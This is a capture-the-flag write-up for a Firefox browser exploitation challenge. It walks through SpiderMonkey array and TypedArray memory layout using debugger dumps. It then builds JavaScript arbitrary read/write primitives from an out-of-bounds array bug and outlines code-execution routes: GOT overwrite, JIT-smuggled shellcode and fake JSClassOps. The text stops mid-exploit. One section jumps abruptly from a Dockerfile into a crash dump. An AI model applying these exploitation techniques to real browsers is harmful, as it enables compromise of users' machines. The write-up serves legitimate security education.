# Outfoxed

**Authors:** [Nspace](https://twitter.com/_MatteoRizzo)

**Tags:** pwn, browser

**Points:** 498

> Just your average, easy browser pwn!
> 
> https://outfoxed.be.ax
>
> [outfoxed.tar.xz](https://corctf2021-files.storage.googleapis.com/uploads/0df560b1a48641ae98116462c1a3d8ebd6605bcf236c4da5beba29f37da94961/outfoxed.tar.xz)

## Analysis

In this challenge the authors visit a webpage of our choosing using a buggy
Firefox. Our job is to exploit the Firefox bug and use it to read the flag which
is stored on the challenge server.

Let's start by checking out the attachments:

```
$ tree outfoxed
outfoxed
├── app
│   ├── flag.txt
│   ├── fox.py
│   └── reader
├── code
│   ├── log
│   ├── mozconfig
│   ├── patch
│   └── README.md
├── docker-compose.yml
└── Dockerfile
```

The challenge runs in a container built from the following Dockerfile:

```dockerfile
FROM python:slim
RUN apt-get update \
	&& apt-get install -y socat curl gzip \
	&& apt-get install -y --no-install-recommends \
	libglib2.0-0 libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 \
	libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libgtk-3-0 \
	libasound2 libxshmfence1 libx11-xcb1 libdbus-glib-1-2 libxtst6 libxt6 && rm -rf /var/lib/apt/lists/*

COPY app/flag.txt /flag.txt
COPY app/reader /reader
RUN chmod 0640 /flag.txt && chmod 6755 /reader

RUN useradd -ms /bin/bash ctf

WORKDIR /app

   164   return math_atan2_handle(cx, args.get(0), args.get(1), args.rval());
   165 }
   166 
   167 double js::math_ceil_impl(double x) {
──────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffc5b0 —▸ 0x3eb45a73d030 —▸ 0x3eb45a7644a0 —▸ 0x3eb45a73b0b8 —▸ 0x55555764cf20 (global_class) ◂— ...
01:0008│     0x7fffffffc5b8 —▸ 0x7ffff6518060 —▸ 0x7fffffffc7a8 ◂— 0x7ffff6518060
02:0010│     0x7fffffffc5c0 ◂— 0x4be574f94dddc200
03:0018│     0x7fffffffc5c8 —▸ 0x7ffff53c1800 —▸ 0x7ffff6563080 —▸ 0x7ffff53ac000 —▸ 0x7ffff653b000 ◂— ...
04:0020│     0x7fffffffc5d0 —▸ 0x7ffff6518000 ◂— 0x0
05:0028│     0x7fffffffc5d8 —▸ 0x7fffffffc618 —▸ 0x7ffff6518000 ◂— 0x0
06:0030│ rbp 0x7fffffffc5e0 —▸ 0x7fffffffc680 —▸ 0x7fffffffca60 —▸ 0x7fffffffcab0 —▸ 0x7fffffffcb20 ◂— ...
07:0038│     0x7fffffffc5e8 —▸ 0x5555568b2252 ◂— mov    r15d, eax
────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► f 0   0x55555689f162
   f 1   0x5555568b2252
   f 2   0x5555568b2252
   f 3   0x5555568ac3ff
   f 4   0x5555568ac3ff
   f 5   0x5555568ac3ff
   f 6   0x5555568a40a8
   f 7   0x5555568b388e
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 
```

## SpiderMonkey Internals

While I have solved numerous browser challenges based on Chromium, I had never
looked at SpiderMonkey (Firefox's JavaScript engine) before. However JavaScript
engines all work in a similar way and my experience with V8 (Chromium's
JavaScript engine) was really helpful in quickly making sense of SpiderMonkey's
internals. I also relied heavily on
[this blog post by 0vercl0k](https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/)
to understand SpiderMonkey and get ideas on how to proceed in my exploit.
I encourage you to go and read it
if you're not already familiar with this engine, but I'll summarize the more
important parts here. As far as I can tell some of the data structures have
changed since that blog post was written, so the information in there is not
entirely up to date. The important parts have stayed the same though.

### JS Arrays

`Array.prototype.oob` lets us read and write out of bounds of a JavaScript array,
so it's important that we first understand how SpiderMonkey stores JavaScript arrays in memory.
A JavaScript array is stored as a [js::NativeObject](https://searchfox.org/mozilla-central/rev/4cca5d2f257c6f1bcef50a0debcbd66524add703/js/src/vm/NativeObject.h#525). We can
print its memory layout using GDB:

```
pwndbg> ptype /o js::NativeObject
/* offset    |  size */  type = class js::NativeObject : public JSObject {
                         protected:
/*    8      |     8 */    js::HeapSlot *slots_;
/*   16      |     8 */    js::HeapSlot *elements_;
                           /* total size (bytes):   24 */
                        }
```

The first 8 bytes contain a pointer to a `js::Shape`, which essentially describes
the memory layout of the object and is used, among other things, by the GC when
it needs to figure out what memory to collect. `slots_` and `elements_` point
to the memory that contains the array's properties, and elements respectively.
We can see this when printing the contents of memory in GDB.

```
js> let a = [1, 2, 3, 4]

pwndbg> tele 0x0e704873d0e0
00:0000│  0xe704873d0e0 —▸ 0xe7048760e20 —▸ 0xe704873b208 —▸ 0x555557650e10 (js::ArrayObject::class_) —▸ 0x55555574c0be ◂— ...
01:0008│  0xe704873d0e8 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0xe704873d0f0 —▸ 0xe704873d108 ◂— 0xfff8800000000001
03:0018│  0xe704873d0f8 ◂— 0x400000000
04:0020│  0xe704873d100 ◂— 0x400000006
05:0028│  0xe704873d108 ◂— 0xfff8800000000001
06:0030│  0xe704873d110 ◂— 0xfff8800000000002
07:0038│  0xe704873d118 ◂— 0xfff8800000000003
08:0040│  0xe704873d120 ◂— 0xfff8800000000004
09:0048│  0xe704873d128 ◂— 0x0
... ↓
```

As we can see, `elements_` points to `0xe704873d108`, which contains the 4
elements of our array. Since a JavaScript array can contain any type of object,
and not just integers, the engine uses _NaN tagging_ to distinguish between
different types. Floats are stored as-is, and other types such as integers and
pointers contain a tag in the upper 17 bits that identifies their type. This is
called _NaN tagging_ because these tagged values correspond to special Not-a-Number
values when interpreted as a floating point number. Here, 0xfff88 is the tag for
integers, and we can indeed see that our 4 array elements are tagged in this way.

We can verify this by printing the contents of an array that contains other types
of objects:
```
js> let a = [1, 2, 13.37, []]

pwndbg> tele 0x10d983000698
00:0000│  0x10d983000698 —▸ 0x12997c760e20 —▸ 0x12997c73b208 —▸ 0x555557650e10 (js::ArrayObject::class_) —▸ 0x55555574c0be ◂— ...
01:0008│  0x10d9830006a0 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0x10d9830006a8 —▸ 0x10d9830006c0 ◂— 0xfff8800000000001
03:0018│  0x10d9830006b0 ◂— 0x400000000
04:0020│  0x10d9830006b8 ◂— 0x400000006
05:0028│  0x10d9830006c0 ◂— 0xfff8800000000001
06:0030│  0x10d9830006c8 ◂— 0xfff8800000000002
07:0038│  0x10d9830006d0 ◂— 0x402abd70a3d70a3d
08:0040│  0x10d9830006d8 ◂— 0xfffe10d9830006f8
09:0048│  0x10d9830006e0 ◂— 0x0
0a:0050│  0x10d9830006e8 ◂— 0x0

pwndbg> p *(double*)0x10d9830006d0
$2 = 13.369999999999999
```

As we expected, 1 and 2 are tagged with 0xfff88, the float is stored untagged,
and the pointer to the array is tagged with 0xfffe. The other two qwords between
`elements_` and the elements storage is a `js::ObjectElements` object that
describes the length and capacity of the array:

```
pwndbg> ptype /o js::ObjectElements
/* offset    |  size */  type = class js::ObjectElements {
                         private:
/*    0      |     4 */    uint32_t flags;
/*    4      |     4 */    uint32_t initializedLength;
/*    8      |     4 */    uint32_t capacity;
/*   12      |     4 */    uint32_t length;
                           /* total size (bytes):   16 */
                         }

pwndbg> p *(js::ObjectElements*)0x10d9830006b0
$3 = {
  flags = 0,
  initializedLength = 4,
  capacity = 6,
  length = 4,
}
```

A typical technique used in exploiting JavaScript engines is to overwrite the
elements pointer of an array, then read or write to the array to gain arbitrary
memory read and write. While this works, it would be annoying to do so in our
exploit because we would need to tag/untag values all the time and we wouldn't
be able to write values that don't correspond to a valid float or tagged value.
Fortunately the JavaScript spec gives us another data structure that is much
more convenient for this.

### JS TypedArrays

In contrast to regular JavaScript arrays, a TypedArray can only contain integers
of a fixed size. For example a Uint32Array can only contain unsigned 32-bit integers.
The elements of a TypedArray are always stored untagged, just like in a C array.
This avoids the problems I described in the previous section and makes TypedArrays
a popular corruption target in JavaScript engine exploits. SpiderMonkey represents
TypedArrays as a [js::ArrayBufferViewObject](https://searchfox.org/mozilla-central/rev/4cca5d2f257c6f1bcef50a0debcbd66524add703/js/src/vm/ArrayBufferViewObject.h#25):

```cpp
class ArrayBufferViewObject : public NativeObject {
 public:
  // Underlying (Shared)ArrayBufferObject.
  static constexpr size_t BUFFER_SLOT = 0;

  // Slot containing length of the view in number of typed elements.
  static constexpr size_t LENGTH_SLOT = 1;

  // Offset of view within underlying (Shared)ArrayBufferObject.
  static constexpr size_t BYTEOFFSET_SLOT = 2;

  // Pointer to raw buffer memory.
  static constexpr size_t DATA_SLOT = 3;

  // ...
}
```

```
js> let a = new Uint32Array([1, 2, 3, 4])

pwndbg> tele 0x07e2a5200698
00:0000│  0x7e2a5200698 —▸ 0x31e83964940 —▸ 0x31e8393b2b0 —▸ 0x555557664870 (js::TypedArrayObject::classes+240) —▸ 0x555555735fd4 ◂— ...
01:0008│  0x7e2a52006a0 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0x7e2a52006a8 —▸ 0x555555767280 (emptyElementsHeader+16) ◂— 0xfff9800000000000
03:0018│  0x7e2a52006b0 ◂— 0xfffa000000000000
04:0020│  0x7e2a52006b8 ◂— 0x4
05:0028│  0x7e2a52006c0 ◂— 0x0
06:0030│  0x7e2a52006c8 —▸ 0x7e2a52006d0 ◂— 0x200000001
07:0038│  0x7e2a52006d0 ◂— 0x200000001
pwndbg> 
08:0040│  0x7e2a52006d8 ◂— 0x400000003
09:0048│  0x7e2a52006e0 ◂— 0x0
... ↓
```

An `ArrayBufferViewObject` has shape, objects, and elements pointers just like
a `NativeObject`. The memory that follows the elements pointers is the storage
for the TypedArray's _slots_, which in this case contain a pointer to an
ArrayBufferObject, the length of the TypedArray, the offset into the
ArrayBufferObject, and a pointer to the TypedArray's elements. The ArrayBuffer
and byte offset pointers aren't really relevant for this exploit so we'll ignore
them here. The data slot is what we really care about, and as you can see it
contains our (untagged) numbers:

```
pwndbg> x/4wx 0x7e2a52006d0
0x7e2a52006d0:	0x00000001	0x00000002	0x00000003	0x00000004
```

## Exploitation

Most, if not all JavaScript engine exploits follow a similar plan: gain arbitrary
read/write in the process' address space and the use that to overwrite some
executable code with shellcode or overwrite a code pointer and start a JOP/ROP
chain. We'll develop the exploit in the JavaScript shell and then make it work
in Firefox.

### Arbitrary R/W

So far the plan seems clear. We will use `Array.prototype.oob` to overwrite the
data pointer of a TypedArray and then use that to read and write to any address.

Let's start by allocating a regular array and a TypedArray. Most (all?) JavaScript
engines allocate objects in sequence, so if we allocate the array the typed
array one after the other they should be next to each other in memory.

```js
let a = new Array(1,2,3,4,5,6);
let b = new BigUint64Array(1);
```

```
pwndbg> tele 0x10a04c000698
00:0000│  0x10a04c000698 —▸ 0x3c159f560e20 —▸ 0x3c159f53b208 —▸ 0x555557650e10 (js::ArrayObject::class_) —▸ 0x55555574c0be ◂— ...
01:0008│  0x10a04c0006a0 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
02:0010│  0x10a04c0006a8 —▸ 0x10a04c0006c0 ◂— 0xfff8800000000001
03:0018│  0x10a04c0006b0 ◂— 0x600000000
04:0020│  0x10a04c0006b8 ◂— 0x600000006
05:0028│  0x10a04c0006c0 ◂— 0xfff8800000000001
06:0030│  0x10a04c0006c8 ◂— 0xfff8800000000002
07:0038│  0x10a04c0006d0 ◂— 0xfff8800000000003
pwndbg> 
08:0040│  0x10a04c0006d8 ◂— 0xfff8800000000004
09:0048│  0x10a04c0006e0 ◂— 0xfff8800000000005
0a:0050│  0x10a04c0006e8 ◂— 0xfff8800000000006
0b:0058│  0x10a04c0006f0 —▸ 0x7ffff53ac910 —▸ 0x7ffff53ac000 —▸ 0x7ffff653b000 —▸ 0x7ffff5343000 ◂— ...
0c:0060│  0x10a04c0006f8 —▸ 0x3c159f564860 —▸ 0x3c159f53b280 —▸ 0x555557664960 (js::TypedArrayObject::classes+480) —▸ 0x55555574f29b ◂— ...
0d:0068│  0x10a04c000700 —▸ 0x5555557672a8 (emptyObjectSlotsHeaders+8) ◂— 0x100000000
0e:0070│  0x10a04c000708 —▸ 0x555555767280 (emptyElementsHeader+16) ◂— 0xfff9800000000000
0f:0078│  0x10a04c000710 ◂— 0xfffa000000000000
pwndbg> 
10:0080│  0x10a04c000718 ◂— 0x1
11:0088│  0x10a04c000720 ◂— 0x0
12:0090│  0x10a04c000728 —▸ 0x10a04c000730 ◂— 0x0
13:0098│  0x10a04c000730 ◂— 0x0
... ↓     4 skipped

pwndbg> distance 0x10a04c0006c0 0x10a04c000728
0x10a04c0006c0->0x10a04c000728 is 0x68 bytes (0xd words)
```

`b`'s data pointer is at `0x10a04c000728` and `a`'s elements are at
`0x10a04c0006c0`. This means that we can overwrite `b`'s data pointer by writing
to the 13th element with `oob`.

```js
let converter = new ArrayBuffer(8);
let u64view = new BigUint64Array(converter);
let f64view = new Float64Array(converter);

// Bit-cast an uint64_t to a float64
function i2d(x) {
    u64view[0] = x;
    return f64view[0];
}

// Bit-cast a float64 to an uint64_t
function d2i(x) {
    f64view[0] = x;
    return u64view[0];
}

let a = new Array(1,2,3,4,5,6);
let b = new BigUint64Array(1);

a.oob(13, i2d(0x41414141n))
b[0] = 0n
```

This crashes by trying to write 0 to 0x41414141, exactly like we would expect:

```
Thread 1 "js" received signal SIGSEGV, Segmentation fault.
0x000022760cf0b110 in ?? ()
────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────
 RAX  0x41414141
 RBX  0x7fffffffc3c8 —▸ 0xbec6100898 —▸ 0x109615e65ac0 —▸ 0x109615e3b2b0 —▸ 0x555557664960 (js::TypedArrayObject::classes+480) ◂— ...
 RCX  0x41414141
 RDX  0xfff9800000000000
 RDI  0x41414141
 RSI  0x0
 R8   0x7fffffffc798 ◂— 0xffffffffffffffff
 R9   0x7fffffffc468 ◂— 0x0
 R10  0xffff800000000000
 R11  0x7fffffffc620 ◂— 0x0
 R12  0xfffdffffffffffff
 R13  0xbec6100898 —▸ 0x109615e65ac0 —▸ 0x109615e3b2b0 —▸ 0x555557664960 (js::TypedArrayObject::classes+480) —▸ 0x55555574f29b ◂— ...
 R14  0x7fffffffc798 ◂— 0xffffffffffffffff
 R15  0x0
 RBP  0x7fffffffc390 —▸ 0x7fffffffc400 —▸ 0x7fffffffc500 —▸ 0x7fffffffc8e0 —▸ 0x7fffffffc930 ◂— ...
 RSP  0x7fffffffc358 —▸ 0x555556b2a783 ◂— jmp    0x555556b2a8e1
 RIP  0x22760cf0b110 ◂— mov    qword ptr [rdi], rsi
──────────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0x22760cf0b110    mov    qword ptr [rdi], rsi
   0x22760cf0b113    ret 
```

We'll encapsulate this in two utility functions, `read64` and `write64`:

```js
// Read 64 bits from addr
function read64(addr) {
    a.oob(13, i2d(addr))
    return b[0];
}

// Write 64 bits to addr
function write64(addr, value) {
    a.oob(13, i2d(addr));
    b[0] = value;
}
```

### Code Execution, Take 1

Before I explain how my final exploit works, I'd like to discuss a technique
which I tried to use at first and which worked in the JS shell but not in Firefox.
I'm not quite sure why it didn't work in Firefox but if you figure it out, let
me know! :)

When researching previous writeups for Firefox challenges I came across [this analysis](https://bruce30262.github.io/Learning-browser-exploitation-via-33C3-CTF-feuerfuchs-challenge/)
of Saelo's [Feuerfuchs](https://github.com/saelo/feuerfuchs) challenge from 33c3.
As it turns out, Firefox does not have full RELRO on Linux (!), so the GOT is
writable. Moreover, the implementation of `TypedArray.prototype.copyWithin(0, x)`
calls `memmove` with the address of the TypedArray's data buffer as the first
argument. In this situation, getting code execution is as simple as overwriting
the GOT entry of `memmove` with the address of `system`, putting our command
in a Uint8Array and calling `copyWithin(0, 1)` on it. Getting the address of
libc and the address of the GOT is trivial with arbitrary read/write: the
TypedArray's `slots_` and `elements_`, which we can leak with `oob`, point to
static objects. Unfortunately for us for some reason even though the GOT of
`libxul.so` (the library that contains the JS engine in Firefox) is writable,
the pointer to `memmove` is not in the GOT. It's in some other section that is
read-only, and the PLT stub for `memmove` gets the address from that section.
I spent a lot of time debugging this and trying to make it work but eventually
had to give up and search for another strategy. Such is life.

### Code Execution, Take 2

Another common technique to turn arbitrary read/write into code execution in a
JavaScript engine is to find and overwrite some executable code. On modern OSes
a memory region is normally either writable or executable, but not both at the
same time to prevent code injection attacks. However the JavaScript engines used
in modern browsers make heavy use of JIT compilation and flipping page
permissions is relatively expensive. So expensive that sometimes browser authors
would rather have memory that is both writable and executable at the same time
than pay the performance cost. This is notably the case with
[WebAssembly in Chrome](https://news.ycombinator.com/item?id=18812449), which
is a [well-known](https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#code-execution)
way to get RWX memory in the renderer process. Unfortunately, it seems that
there is no such easy bypass in Firefox. Or at least I couldn't find one by
searching the internet, let me know if I missed something :) We are going to need
yet another approach.

### Code Execution, Take 3

At this point I went back to [0vercl0k's blog post](https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/),
which has a section on how to [get the JIT compiler to generate arbitrary gadgets for you](https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#force-the-jit-of-arbitrary-gadgets-bring-your-own-gadgets).
Sounds promising! The idea is to encode some machine instructions in JavaScript
floating-point constants, then get the JIT to compile your function. The compiled
machine code will contain our constants (aka our gadgets) as immediates and we
can execute them by jumping into the middle of the immediate. Cool! I even found
[a blog post](https://vigneshsrao.github.io/posts/writeup/#injecting-shellcode)
that includes some Linux shellcode so I don't even have to write my own ;)
This shellcode reads a pointer from `[rcx]`, changes the protection of the page
containing that address to RWX, and jumps to it.

All we have to do is find a way to jump to the JITed shellcode with rcx pointing
to a pointer to controlled data. Again,
0vercl0k's blog post is very useful here, specifically [this section](https://doar-e.github.io/blog/2018/11/19/introduction-to-spidermonkey-exploitation/#hijacking-control-flow). In short,
every JS object type (e.g. `js::ArrayObject`) in SpiderMonkey has an associated
`JSClass` which describes the type.

```
pwndbg> ptype /o JSClass
/* offset    |  size */  type = struct JSClass {
/*    0      |     8 */    const char *name;
/*    8      |     4 */    uint32_t flags;
/* XXX  4-byte hole  */
/*   16      |     8 */    const struct JSClassOps *cOps;
/*   24      |     8 */    const struct js::ClassSpec *spec;
/*   32      |     8 */    const struct js::ClassExtension *ext;
/*   40      |     8 */    const struct js::ObjectOps *oOps;

                           /* total size (bytes):   48 */
                         }
```

`JSClass::cOps` points to a table of function pointers which the engine calls
when the JavaScript code does certain operations on an object that belongs to
this class, much like a C++ vtable:

```
pwndbg> ptype /o JSClassOps
/* offset    |  size */  type = struct JSClassOps {
/*    0      |     8 */    JSAddPropertyOp addProperty;
/*    8      |     8 */    JSDeletePropertyOp delProperty;
/*   16      |     8 */    JSEnumerateOp enumerate;
/*   24      |     8 */    JSNewEnumerateOp newEnumerate;
/*   32      |     8 */    JSResolveOp resolve;
/*   40      |     8 */    JSMayResolveOp mayResolve;
/*   48      |     8 */    JSFinalizeOp finalize;
/*   56      |     8 */    JSNative call;
/*   64      |     8 */    JSHasInstanceOp hasInstance;
/*   72      |     8 */    JSNative construct;
/*   80      |     8 */    JSTraceOp trace;

                           /* total size (bytes):   88 */
                         }
pwndbg> ptype JSAddPropertyOp
type = bool (*)(struct JSContext *, JS::HandleObject, JS::HandleId, JS::HandleValue)
```

For example, `cOps->addProperty` is called whenever JS code adds a new property
to the object. The fourth argument (stored in `rcx` on Linux) contains a handle
(a pointer) to the value of the new property. This is perfect because we can
completely control this value, and for example we can pass the address of a
buffer containing a second-stage shellcode. Great!

We cannot directly overwrite the `JsClassOps` because they are stored in read-only
memory. However we can simply follow the chain of pointers from our object to
`JSClassOps` and replace the last pointer in the chain that is in writable memory
with a pointer to a fake. Again, this is all described in 0vercl0k's post so
I won't bore you with the details.

```js
